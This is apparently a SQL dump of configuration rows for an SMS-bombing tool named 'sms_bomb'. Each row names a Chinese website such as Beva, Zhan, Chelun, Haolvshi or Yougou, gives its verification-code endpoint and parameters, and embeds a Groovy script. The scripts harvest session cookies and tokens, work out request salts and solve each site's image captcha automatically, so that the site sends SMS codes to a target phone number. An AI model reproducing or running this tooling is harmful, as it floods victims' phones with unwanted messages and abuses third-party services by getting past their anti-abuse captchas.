INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (173893409730203648, 'https://www.beva.com/img/beva-logo.png', '贝瓦网', 'https://www.beva.com/', 'https://passport.beva.com/passport/v1/web/sendVcode', 'mobile', '{\"scene\":\"register\"}', '', '2023-01-02 20:30:20', '2023-01-16 22:25:29', 0, '注册', 'key=errorCode,value=0', '', 1, 'BevaScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.http.HeaderElement\n\nimport java.nio.file.Files\nimport java.nio.file.Paths\nimport java.nio.file.StandardCopyOption\n\n/**\n * 贝尔儿歌\n */\nclass BevaScript extends SmsCommonScript {\n\n    private String baseUrl = \'https://passport.beva.com\'\n\n\n    private String preUrl = \"${this.baseUrl}/passportv1/pPv1web/captcha/refresh/1\"\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def preResponse = HttpUtils.get(preUrl, null, headerMap, responseHeaderMap)\n        List<HeaderElement[]> headerElements = responseHeaderMap.get(\'Set-Cookie\')\n        if (headerElements != null) {\n            headerElements.stream()\n                    .filter(p->Objects.equals(p[0].getName(),\'PHPSESSID\'))\n                    .findFirst()\n                    .map(c-> {\n                        if (headerMap.containsKey(\'Cookie\')) {\n                            if (!headerMap.get(\'Cookie\').toString().contains(\'PHPSESSID\')) {\n                                headerMap.put(\"Cookie\", headerMap.get(\'Cookie\').toString() + \";\" + c[0].getName() + \'=\' + c[0].getValue())\n                            }\n                        } else {\n                            headerMap.put(\"Cookie\", c[0].getName() + \'=\' + c[0].getValue())\n                        }\n                    })\n        }\n        String captchaUrl = baseUrl + new JsonSlurper().parseText(preResponse)[\'url\']\n        def inputStream = HttpUtils.getStreaming(captchaUrl, headerMap)\n        Files.copy(inputStream, Paths.get(\'/Users/lei2j/Downloads/test.jpg\'), StandardCopyOption.REPLACE_EXISTING)\n        def captcha = identifyImgCaptcha(new File(\'/Users/lei2j/Downloads/test.jpg\'))\n        paramsMap.put(\'pcode\', captcha)\n    }\n\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://passport.beva.com/passport/v1/web/mobileregister][Accept: application/json, text/javascript, */*; q=0.01]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (173949170934091776, 'https://passport.zhan.com/Public/Ucenter/loginimg/logo.png', '小站雅思', 'https://passport.zhan.com/', 'https://passport.zhan.com/Users/sendSms', 'phone', '{\"cnum\":\"86\",\"phone_activate_type\":\"102\",\"id\":\"phone_register\"}', '', '2023-01-03 00:11:54', '2023-01-10 00:35:29', 0, '注册', 'key=status,value=200', 'key=status,value=500', 1, 'XiaoZhanEduScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 小站教育\n */\nclass XiaoZhanEduScript extends SmsCommonScript{\n\n    private String preUrl = \'https://passport.zhan.com/Users/changImg\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        def preParamsMap = [id: paramsMap.get(\'id\')]\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def inputStream = HttpUtils.getStreaming(preUrl, headerMap, preParamsMap, responseHeaderMap)\n        setCookie(responseHeaderMap, headerMap)\n        def captcha = identifyImgCaptcha(inputStream)\n        paramsMap[\'auth_code\'] = captcha\n    }\n\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://passport.zhan.com/Users/register.html?url=https%3A%2F%2Fielts.zhan.com%2F]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (174682775834595328, 'https://www.chelun.com/logo-colorful.png', '车轮网', 'https://www.chelun.com/', 'https://api-pchome.chelun.com/pc_home/get_sms_captcha', 'phone', '{\"type\":\"1\"}', '', '2023-01-05 00:46:59', '2023-01-10 00:34:38', 0, '注册', 'key=code,value=0', 'key=code,value=13', 1, 'ChelunScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.http.HeaderElement\n\n/**\n * 车轮网\n */\nclass ChelunScript extends SmsCommonScript{\n\n    private String preUrl = \'https://api-pchome.chelun.com/pc_home/get_img_captcha\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        def preResponse = HttpUtils.postFormUrlencoded(preUrl, null, headerMap, null)\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def object = new JsonSlurper().parseText(preResponse)\n        String apiTicket = object[\'data\'][\'img\'][\'api_ticket\']\n        String imgUrl = object[\'data\'][\'img\'][\'url\']\n        def inputStream = HttpUtils.getStreaming(imgUrl, headerMap, null, responseHeaderMap)\n        def captcha = identifyImgCaptcha(inputStream)\n        paramsMap[\'img\'] = captcha.toLowerCase()\n        paramsMap[\'apiticket\'] = apiTicket\n        super.setCookie(responseHeaderMap, headerMap, false)\n    }\n}', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer:https://www.chelun.com/]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (175659566095142912, 'https://www.haolvshi.com.cn/img/logo.jpg', '好律师', 'https://www.haolvshi.com.cn/', '', 'mobile', '{\"debug\":\"true\",\"browser\":\"webKit\",\"source\":\"pc\",\"system\":\"pc\"}', '', '2023-01-07 17:28:24', '2023-01-10 00:33:14', 0, '短信验证码登录', 'key=s,value=true', 'key=d,value=3', 1, 'HaolvshiScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\n\n/**\n * 好律师\n */\nclass HaolvshiScript extends SmsCommonScript{\n\n    private String k = \'k\'\n    private String serviceTokenKey = \'serviceToken\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        def haoLvShiConfig = getConfig(null)\n        paramsMap.put(\'version\', haoLvShiConfig.configVersion)\n        getServiceToken(smsUrlConfig, paramsMap, headerMap, haoLvShiConfig)\n        getMd5Salt(smsUrlConfig, paramsMap, headerMap, haoLvShiConfig)\n        smsUrlConfig.setSmsUrl(getContext(\'u\', false, haoLvShiConfig.apiUrlImgOn, haoLvShiConfig.apiContexts) + \'/user/sendMobileVerifyCode\')\n    }\n\n    @Override\n    Boolean postProcess(ScriptContext scriptContext) {\n        return super.postProcess(scriptContext)\n    }\n\n    private String getServiceToken(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap, HaoLvShiConfig haoLvShiConfig) {\n        def list = [\"api\", \"u\", \"cmt\", \"consult\", \"contract\", \"order\"]\n        def preParamsMap = [system: paramsMap.get(\'system\'), source: paramsMap.get(\'source\'), browser: paramsMap.get(\'browser\'),version:haoLvShiConfig.configVersion, debug: paramsMap.get(\'debug\'), (k): \'\']\n        def response = HttpUtils.postFormUrlencoded(getContext(list[new Random().nextInt(list.size())], false, haoLvShiConfig.apiUrlImgOn, haoLvShiConfig.apiContexts) + \'/token/add\', preParamsMap, headerMap)\n        def object = new JsonSlurper().parseText(response)\n        paramsMap[(k)] = object[\'d\']\n        setCookie(serviceTokenKey, String.valueOf(object[\'d\']), headerMap)\n        object[\'d\']\n    }\n\n    private String getMd5Salt(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap, HaoLvShiConfig haoLvShiConfig) {\n        def preParamsMap = [system: paramsMap.get(\'system\'),\n                            source: paramsMap.get(\'source\'),\n                            browser: paramsMap.get(\'browser\'),\n                            debug: paramsMap.get(\'debug\'),\n                            version: haoLvShiConfig.configVersion,\n                            (k): paramsMap.get(k),\n                            mobile: paramsMap.get(smsUrlConfig.getPhoneParamName())]\n        def response = HttpUtils.postFormUrlencoded(getContext(\'u\', false, haoLvShiConfig.apiUrlImgOn, haoLvShiConfig.apiContexts) + \'/user/addCookies\', preParamsMap, headerMap)\n        def object = new JsonSlurper().parseText(response)\n        paramsMap[\'fk\'] = String.valueOf(object[\'random\'] + \'!h@a#o$\').md5()\n        object[\'random\']\n    }\n\n    private HaoLvShiConfig getConfig(HaoLvShiConfig haoLvShiConfig){\n        haoLvShiConfig = new HaoLvShiConfig()\n        def response = HttpUtils.get(\"https://js.haolvshi.com.cn/config/config.js?v=\" + System.currentTimeMillis())\n        haoLvShiConfig.configVersion = \'PC.V.\'+getValue(response,\'config_version_Q\')\n        haoLvShiConfig.versionNum = getValue(response,\'versionNum\')\n        haoLvShiConfig.apiVersion = getValue(response,\'apiVersion\')\n        haoLvShiConfig.apiSubversion = getValue(response,\'apiSubversion\')\n        def apiUrlImgOn = [\n                api: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/api/\",\n                apiimg: \"//api.haolvshi.com.cn/\",\n                cmt: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/cmt\",\n                cmtimg: \"//cmt.haolvshi.com.cn/\",\n                consult: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/consult/\",\n                consultimg: \"//consult.haolvshi.com.cn/\",\n                contract: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/contract/\",\n                contractimg: \"//contract.haolvshi.com.cn/\",\n                crf: \"//crf.haolvshi.com.cn\",\n                fin: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/fin\",\n                finimg: \"//fin.haolvshi.com.cn/\",\n                notify: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/notify\",\n                notifyimg: \"//notify.haolvshi.com.cn/\",\n                order: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/order/\",\n                orderimg: \"https://order.haolvshi.com.cn/\",\n                pay: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/pay/\",\n                payimg: \"//pay.haolvshi.com.cn/\",\n                u: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/u/\",\n                uimg: \"//u.haolvshi.com.cn/\",\n                uimg: \"//u.haolvshi.com.cn\",\n                zt: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/zt/\",\n                ztimg: \"//zt.haolvshi.com.cn/\",\n                en: \"//en.haolvshi.com.cn\",\n                www: \"//www.haolvshi.com.cn\",\n                boss: \"//boss.haolvshi.com.cn/\",\n                m: \"https://m.haolvshi.com.cn\",\n                news: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/zt/\",\n                newsimg: \"//news.haolvshi.com.cn/\",\n                bbs: \"//bbs.haolvshi.com.cn\",\n                www_zt: \"//www.haolvshi.com.cn/zt\",\n                www_news: \"//www.haolvshi.com.cn/ns\",\n                fileImg: \"//file.haolvshi.com.cn\",\n                wenku: \"//www.haolvshi.com.cn/apis/${haoLvShiConfig.versionNum}/wenku/\"\n        ]\n        def apiContexts = [\n                api: apiUrlImgOn.api,\n                apiimg: apiUrlImgOn.apiimg,\n                cmt: apiUrlImgOn.cmt,\n                cmtimg: apiUrlImgOn.cmtimg,\n                consult: apiUrlImgOn.consult,\n                contractimg: apiUrlImgOn.contractimg,\n                contract: apiUrlImgOn.contract,\n                contractimg: apiUrlImgOn.contractimg,\n                crf: apiUrlImgOn.crf + \'/\' + haoLvShiConfig.apiVersion + \'/\',\n                fin: apiUrlImgOn.fin,\n                finimg: apiUrlImgOn.finimg,\n                notify: apiUrlImgOn.notify,\n                notifyimg: apiUrlImgOn.notifyimg,\n                order: apiUrlImgOn.order,\n                orderimg: apiUrlImgOn.orderimg,\n                pay: apiUrlImgOn.pay,\n                payimg: apiUrlImgOn.payimg,\n                u: apiUrlImgOn.u,\n                uimg: apiUrlImgOn.uimg,\n                zt: apiUrlImgOn.zt,\n                ztimg: apiUrlImgOn.ztimg + \'/\' + haoLvShiConfig.apiVersion + \'/\',\n                en: apiUrlImgOn.en + \'/\' + haoLvShiConfig.apiVersion + \'/\',\n                www: apiUrlImgOn.www,\n                m: apiUrlImgOn.m,\n                news: apiUrlImgOn.news,\n                newsimg: apiUrlImgOn.newsimg,\n                bbs: apiUrlImgOn.bbs,\n                www_zt: apiUrlImgOn.www_zt,\n                www_news: apiUrlImgOn.www_news,\n                fileImg: apiUrlImgOn.fileImg + \'/\',\n                wenku: apiUrlImgOn.wenku + \'/\',\n        ]\n        haoLvShiConfig.apiUrlImgOn = apiUrlImgOn\n        haoLvShiConfig.apiContexts = apiContexts\n        haoLvShiConfig\n    }\n\n    private static String getContext(String s, boolean hasVersion, def apiUrl, def apiContexts) {\n        if (s == null) {\n            s = \'api\'\n        }\n        def uriList = []\n        if (hasVersion) {\n            uriList = [\n                    api        : apiUrl.api,\n                    apiimg     : apiUrl.apiimg,\n                    cmt        : apiUrl.cmt,\n                    cmtimg     : apiUrl.cmtimg,\n                    consult    : apiUrl.consult,\n                    consultimg : apiUrl.consultimg,\n                    contract   : apiUrl.contract,\n                    contractimg: apiUrl.contractimg,\n                    crf        : apiUrl.crf,\n                    fin        : apiUrl.fin,\n                    finimg     : apiUrl.finimg,\n                    notify     : apiUrl.notify,\n                    notifyimg  : apiUrl.notifyimg,\n                    order      : apiUrl.order,\n                    orderimg   : apiUrl.orderimg,\n                    pay        : apiUrl.pay,\n                    payimg     : apiUrl.payimg,\n                    u          : apiUrl.u,\n                    uimg       : apiUrl.uimg,\n                    zt         : apiUrl.zt,\n                    ztimg      : apiUrl.ztimg,\n                    en         : apiUrl.en,\n                    www        : apiUrl.www,\n                    boss       : apiUrl.boss,\n                    m          : apiUrl.m,\n                    news       : apiUrl.news,\n                    newsimg    : apiUrl.newsimg,\n                    bbs        : apiUrl.bbs,\n                    www_zt     : apiUrl.www_zt,\n                    www_news   : apiUrl.www_news,\n                    fileImg    : apiUrl.fileImg,\n                    wenku      : apiUrl.wenku,\n            ]\n        } else {\n            uriList = [\n                    api        : apiContexts.api,\n                    apiimg     : apiUrl.apiimg,\n                    u          : apiContexts.u,\n                    uimg       : apiUrl.uimg,\n                    crf        : apiContexts.crf,\n                    cmt        : apiContexts.cmt,\n                    cmtimg     : apiContexts.cmtimg,\n                    consult    : apiContexts.consult,\n                    consultimg : apiContexts.consultimg,\n                    contractimg: apiUrl.contractimg,\n                    contract   : apiContexts.contract,\n                    order      : apiContexts.order,\n                    orderimg   : apiContexts.orderimg,\n                    fin        : apiContexts.fin,\n                    finimg     : apiContexts.finimg,\n                    notify     : apiContexts.notify,\n                    notifyimg  : apiContexts.notifyimg,\n                    pay        : apiContexts.pay,\n                    payimg     : apiContexts.payimg,\n                    zt         : apiContexts.zt,\n                    ztimg      : apiContexts.ztimg,\n                    en         : apiContexts.en,\n                    www        : apiContexts.www,\n                    boss       : apiUrl.boss,\n                    m          : apiContexts.m,\n                    news       : apiContexts.news,\n                    newsimg    : apiContexts.newsimg,\n                    bbs        : apiContexts.bbs,\n                    www_zt     : apiContexts.www_zt,\n                    www_news   : apiContexts.www_news,\n                    fileImg    : apiContexts.fileImg,\n                    wenku      : apiContexts.wenku\n            ]\n        }\n        String.valueOf(uriList[s]).startsWith(\"http\") ? uriList[s] : \'https:\' + uriList[s]\n    }\n\n    private static String getValue(String response, String key) {\n        def matcher = response =~ key + \'\\\\s*=\\\\s*\\\'{0,1}(.*?)\\\'{0,1}[;\\r\\n]\'\n        assert matcher.find()\n        return matcher.group(1).trim()\n    }\n\n    private static class HaoLvShiConfig {\n\n        private String configVersion\n\n        private String versionNum\n\n        private String apiVersion\n\n        private String apiSubversion\n\n        private def apiUrlImgOn\n\n        private def apiContexts\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[referer: https://www.haolvshi.com.cn/user/login/index.html]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (175705680143978496, 'https://www.yougou.com/template/common/images/logo.png', '优购时尚商城', 'https://www.yougou.com/', 'https://passport.yougou.com/my/getMobileCode.jhtml', 'phone', '{\"codes\":\"checkCode\"}', '', '2023-01-07 20:31:39', '2023-02-05 22:53:00', 0, '用户注册', '', '2', 1, 'YouGouScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 优购商城\n */\nclass YouGouScript extends SmsCommonScript{\n\n    private String imgUrl = \'https://passport.yougou.com/servlet/imageCaptcha?rand=\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def inputStream = HttpUtils.getStreaming(imgUrl + Math.random(), headerMap, null, responseHeaderMap)\n        setCookie(responseHeaderMap, headerMap)\n        def captcha = identifyImgCaptcha(inputStream)\n        paramsMap[\'validCode\'] = captcha\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://passport.yougou.com/register.jhtml?redirectURL=https://www.yougou.com/]', 'text', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (175712196267872256, 'http://book.easou.com/jsp/online/resources/imgs/icon.png', '宜搜小说', 'https://book.easou.com/', 'https://book.easou.com/ta/phonevcode.m', 'phone', '', '', '2023-01-07 20:57:32', '2023-01-10 00:30:56', 0, '注册', 'key=state,value=true', 'key=code,value=2029', 1, 'EasouScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 宜搜小说\n */\nclass EasouScript extends SmsCommonScript{\n\n    private String imgUrl = \'https://book.easou.com/ta/imgVcode.m\'\n\n    private String getCookieUrl = \'https://book.easou.com/ta/registerByPhone.m?backUrl=%2Fta%2Findex.m\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        setCookie(smsUrlConfig, paramsMap, headerMap)\n        def inputStream = HttpUtils.getStreaming(imgUrl, headerMap, [attach: paramsMap.get(smsUrlConfig.getPhoneParamName()), r: String.valueOf(System.currentTimeMillis())])\n        def captcha = identifyImgCaptcha(inputStream)\n        paramsMap[\'imgVcode\'] = captcha\n        smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl() + \"?r=\" + System.currentTimeMillis())\n    }\n\n    private void setCookie(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap){\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        HttpUtils.get(getCookieUrl, null, headerMap, responseHeaderMap)\n        setCookie(responseHeaderMap, headerMap, true)\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://book.easou.com/ta/registerByPhone.m?backUrl=%2Fta%2Findex.m]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (176088848806187008, 'https://img.yimutian.com/crm/5faa461c2d211f71023ef21700bc006c.png', '一亩田商户端', 'https://s.ymt.com/', 'https://s.ymt.com/gfw/uc/login/phoneverify/websendsms.json', 'mobile', '{\"app_key\":\"4001\",\"fCode\":\"1000002\"}', '', '2023-01-08 21:54:13', '2023-01-16 22:26:08', 0, '登录', 'key=status,value=0', 'key=status,value=1017\nkey=status,value=1005', 1, 'YMTScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.http.HeaderElement\n\n/**\n * 一亩田\n */\nclass YMTScript extends SmsCommonScript{\n\n    private String codeStrUrl = \'https://s.ymt.com/gfw/captcha/api/getcodestr.json\'\n\n    private String imgUrl = \'https://s.ymt.com/gfw/captcha/api/genimage\'\n\n    private String codeStrKey = \'code_str\'\n\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        setAppUid(smsUrlConfig, paramsMap, headerMap)\n        def codeStr = getCodeStr(smsUrlConfig, paramsMap, headerMap)\n        paramsMap.put(codeStrKey, codeStr)\n        int index\n        if ((index = smsUrlConfig.getSmsUrl().indexOf(\'?\')) != -1) {\n            smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl().substring(0, index))\n        }\n        getImgUrl(smsUrlConfig, paramsMap, headerMap)\n        smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl() + \"?app_key=${paramsMap.get(\'app_key\')}&fCode=${paramsMap.get(\'fCode\')}\")\n        paramsMap.remove(\'app_key\')\n        paramsMap.remove(\'fCode\')\n    }\n\n    private void setAppUid(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap) {\n        String uidCookiekey = \'symtcom_uid\'\n        if (headerMap.containsKey(\'Cookie\') && headerMap.get(\'Cookie\').contains(uidCookiekey)) {\n            return\n        }\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def post = HttpUtils.post(\'https://s.ymt.com/gfw/uc/ucenter/index/websecurity.json\', null, paramsMap, headerMap, responseHeaderMap)\n        setCookie(responseHeaderMap, headerMap, true)\n        def value = headerMap.get(\'Cookie\')\n        def appUid = new JsonSlurper().parseText(post)[\'app_uid\']\n        if (value) {\n            headerMap.put(\'Cookie\', \"${value + \';\' + uidCookiekey + \'=\' + appUid}\".toString())\n        } else {\n            headerMap.put(\'Cookie\',\"${uidCookiekey + \'=\' + appUid}\".toString())\n        }\n    }\n\n    private String getCodeStr(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap) {\n        def response = HttpUtils.get(codeStrUrl, paramsMap, headerMap)\n        new JsonSlurper().parseText(response)[\'code_str\'].toString()\n    }\n\n    private String getImgUrl(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap) {\n        def inputStream = HttpUtils.getStreaming(imgUrl, headerMap, paramsMap)\n        def captcha = identifyImgCaptcha(inputStream)\n        paramsMap.put(\'captcha\', captcha)\n    }\n}\n', NULL, 'POST', 'application/json', '[referer: https://s.ymt.com/][x-app-version: V1.0.1][x-user-agent: 4001][Cookie: symtcominitedUUID=1]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (178280113673080832, 'https://static.jtljia.com/images/system/logo-login.png', '金螳螂装修', 'https://www.jtljia.com/', 'https://user.jtljia.com/jia-web/msg/svcd/{token}', 'phone', '{\"type\":\"1\",\"position\":\"%E5%85%A8%E9%A1%B5%E9%9D%A2\"}', '', '2023-01-14 23:01:31', '2023-02-05 22:59:15', 0, '注册', 'key=status,value=1', 'key=status,value=0', 1, 'JinTangLangHomeScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.commons.lang3.RandomStringUtils\n\n/**\n * 金螳螂家装修\n */\nclass JinTangLangHomeScript extends SmsCommonScript{\n\n    private String preImgUrl = \'https://user.jtljia.com/jia-web/ValidateImage.do?position=%E5%85%A8%E9%A1%B5%E9%9D%A2\'\n    private String callback = \'callback\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        def response = HttpUtils.get(preImgUrl, null, scriptContext.getHeaderMap())\n        def object = new JsonSlurper().parseText(response)\n        def imgCaptcha = identifyImgCaptcha(object[\'data\'] as String)\n        step2(scriptContext)\n        scriptContext.getParamsMap().put(\'imgtoken\', object[\'message\'])\n        scriptContext.getParamsMap().put(\'imageVcode\', imgCaptcha.toString().toLowerCase())\n    }\n\n    private void step2(ScriptContext scriptContext){\n        String phone = scriptContext.getParamsMap().get(scriptContext.getSmsUrlConfig().getPhoneParamName())\n        String url = \"https://user.jtljia.com/jia-web/msg/tknValue/${phone}\"\n        def callbackValue = \"jQuery${RandomStringUtils.randomNumeric(20) + \'_\' + System.currentTimeMillis()}\"\n        scriptContext.getParamsMap().put(callback, callbackValue)\n        def response = HttpUtils.get(url, scriptContext.getParamsMap(), scriptContext.getHeaderMap())\n        assert parseJsonp(scriptContext, response, callbackValue, \"key=status,value=1\")\n        def regex = ~/${callbackValue}\\((.*)\\)/\n        def matcher = regex.matcher(response)\n        assert matcher.find()\n        scriptContext.getSmsUrlConfig().setSmsUrl(scriptContext.getSmsUrlConfig().getSmsUrl().replace(\"{token}\", new JsonSlurper().parseText(matcher.group(1))[\'message\'].toString()))\n    }\n}\n', NULL, 'GET', 'application/json', '[Referer: https://www.jtljia.com/]', 'jsonp', NULL, 2);
